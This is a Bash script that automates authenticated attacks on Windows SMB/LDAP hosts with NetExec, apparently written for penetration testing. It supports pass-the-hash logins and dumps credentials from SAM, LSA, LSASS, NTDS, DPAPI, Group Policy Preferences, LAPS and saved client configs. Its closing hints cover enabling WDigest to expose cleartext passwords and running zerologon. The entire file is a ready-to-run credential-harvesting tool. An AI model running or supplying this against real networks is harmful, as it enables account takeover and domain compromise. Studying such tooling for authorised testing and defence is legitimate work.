#!/usr/bin/env bash
# File: auth_smb
# Author: strikoder
#
# Description:
#   Perform authenticated SMB/LDAP enumeration and common NetExec modules.
#   Supports both local and domain authentication with password or hash.
#
# Usage:
#   ./auth_smb.sh -t <IP> -u <USER> [-p <PASS> | -H <HASH>] [-d <DOMAIN>]
#
# Arguments:
#   -t <IP>      Target host (IP or hostname)
#   -u <USER>    Username (local user or domain user)
#   -p <PASS>    Password (quote if it contains special chars)
#   -H <HASH>    NTLM hash (instead of password)
#   -d <DOMAIN>  Optional domain name. If given, domain auth is used.
#
# Auth modes:
#   - Domain mode: uses -d <DOMAIN> -u <USER> -p <PASS> (or -H <HASH>)
#   - Local mode:  uses --local-auth -u <USER> -p <PASS> (or -H <HASH>)
#
# What it does:
#   1) Runs SMB enumeration with common flags:
#        --shares, --users, --pass-pol, --loggedon-users, --qwinsta
#   2) If domain auth is set, runs LDAP enumeration (--groups)
#   3) Runs DPAPI checks (base, cookies, nosystem). Local-auth variant only in local mode.
#   4) Runs useful NetExec modules:
#        - In domain mode: spider_plus, gpp_password, gpp_autologin,
#          wifi, powershell_history, lsassy, rdcman, backup_operator
#        - In local mode: sam, lsa, lsass
#
# Output:
#   All command results are printed live to console. No separate log files.
#
# Notes:
#   - Requires `nxc` (NetExec) installed in PATH.
#   - For domain auth, supply `-d <DOMAIN>`. For local accounts, omit -d.
#   - Some modules (sam/lsa/lsass/etc.) require local administrator rights.
#   - Extra manual modules you can run later:
#       nxc smb <IP> <auth> -M wdigest -o ACTION=enable|disable
#       nxc smb <IP> <auth> -M zerologon   # (lab use only)
set -euo pipefail

IP=""; USER=""; PASS=""; HASH=""; DOMAIN=""
while [[ $# -gt 0 ]]; do
  case "$1" in
    -t) IP="$2"; shift 2 ;;
    -u) USER="$2"; shift 2 ;;
    -p) PASS="$2"; shift 2 ;;
    -H) HASH="$2"; shift 2 ;;
    -d) DOMAIN="$2"; shift 2 ;;
    *) echo "Usage: $0 -t <IP> -u <USER> [-p <PASS> | -H <HASH>] [-d <DOMAIN>]"; exit 1 ;;
  esac
done
[[ -z "$IP" || -z "$USER" ]] && { echo "Missing -t/-u"; exit 1; }
[[ -z "$PASS" && -z "$HASH" ]] && { echo "Must provide either -p <PASS> or -H <HASH>"; exit 1; }
[[ -n "$PASS" && -n "$HASH" ]] && { echo "Cannot use both -p and -H"; exit 1; }
command -v nxc >/dev/null || { echo "nxc not in PATH"; exit 1; }

log(){ echo -e "\n==== $* ====\n"; }

# Auth mode
if [[ -n "$DOMAIN" ]]; then
  MODE="domain"
  if [[ -n "$HASH" ]]; then
    BASE=(-d "$DOMAIN" -u "$USER" -H "$HASH")
  else
    BASE=(-d "$DOMAIN" -u "$USER" -p "$PASS")
  fi
else
  MODE="local"
  if [[ -n "$HASH" ]]; then
    BASE=(--local-auth -u "$USER" -H "$HASH")
  else
    BASE=(--local-auth -u "$USER" -p "$PASS")
  fi
fi
log "Auth mode: $MODE ($([ -n "$HASH" ] && echo "hash" || echo "password"))"

## 0) NMAP
log "nmap safe SMB scripts"
nmap -Pn -p445 -sV --script "smb-security-mode,smb-protocols,smb2-capabilities,smb-vuln-ms17-010" "$IP" || true
echo


## 1) SMB recon (per-flag, clear output)
FLAGS=(--shares --users --pass-pol --loggedon-users --qwinsta)

OUTDIR="results_auth_smb"
OUTFILE="$OUTDIR/auth_smb_usernames.txt"
mkdir -p "$OUTDIR"
log "Saving available users to $OUTFILE"

for f in "${FLAGS[@]}"; do
  log "SMB flag: $f"
  if [[ "$f" == "--users" ]]; then
    OUTDIR="results_auth_smb"
    OUTFILE="$OUTDIR/auth_smb_usernames.txt"
    mkdir -p "$OUTDIR"
    nxc smb "$IP" "${BASE[@]}" "$f" 2>&1 | tee "$OUTFILE" | awk '/user(name)?/I {print $2}' >"$OUTFILE"
    log "Usernames saved to $OUTFILE"
  else
    nxc smb "$IP" "${BASE[@]}" "$f" || true
  fi
done

## 1b) LDAP recon (only when domain auth)
if [[ "$MODE" == "domain" ]]; then
  log "LDAP: --groups"
  if [[ -n "$HASH" ]]; then
    nxc ldap "$IP" -d "$DOMAIN" -u "$USER" -H "$HASH" --groups || true
  else
    nxc ldap "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS" --groups || true
  fi
else
  log "Skip LDAP (needs domain auth)"
fi

## 2) DPAPI variants
log "DPAPI base"
nxc smb "$IP" "${BASE[@]}" --dpapi || true
log "DPAPI cookies"
nxc smb "$IP" "${BASE[@]}" --dpapi cookies || true
log "DPAPI nosystem"
nxc smb "$IP" "${BASE[@]}" --dpapi nosystem || true

if [[ "$MODE" == "local" ]]; then
  log "DPAPI nosystem (explicit local-auth)"
  if [[ -n "$HASH" ]]; then
    nxc smb "$IP" --local-auth -u "$USER" -H "$HASH" --dpapi nosystem || true
  else
    nxc smb "$IP" --local-auth -u "$USER" -p "$PASS" --dpapi nosystem || true
  fi
else
  log "Skip DPAPI local-auth variant (domain mode)"
fi

## 3) Modules
MODULES=(laps gpp_password gpp_autologin wifi putty powershell_history lsassy nanodump mremoteng notepad++ winscp vnc wifi reg-winlogon rdcman backup_operator)
LOCAL_ADMIN_MODULES=(sam lsa lsass ntds gmsa)

# Run local-admin only modules if not in domain mode
if [[ "$MODE" == "local" ]]; then
  for m in "${LOCAL_ADMIN_MODULES[@]}"; do
    log "Module (local-admin): $m"
    if [[ -n "$HASH" ]]; then
      nxc smb "$IP" --local-auth -u "$USER" -H "$HASH" -M "$m" || true
    else
      nxc smb "$IP" --local-auth -u "$USER" -p "$PASS" -M "$m" || true
    fi
  done
else
  for m in "${MODULES[@]}"; do
    log "Module: $m"
    nxc smb "$IP" "${BASE[@]}" -M "$m" || true
  done
fi

log "Done"

# Hints
log "Tips & Hints"
cat <<'EOT'
- Domain mode is used when -d <DOMAIN> is provided; otherwise the script uses --local-auth.
- Use -p for password authentication or -H for NTLM hash authentication (pass-the-hash).
- LDAP --groups runs only in domain mode.
- Extra modules you can run manually if needed:
    * WDigest (enable cleartext creds in LSASS):
        nxc smb <IP> <auth> -M wdigest -o ACTION=enable
      Cleanup afterwards (IRL):
        nxc smb <IP> <auth> -M wdigest -o ACTION=disable
    * Zerologon (high impact, only run in lab):
        nxc smb <IP> <auth> -M zerologon
EOT
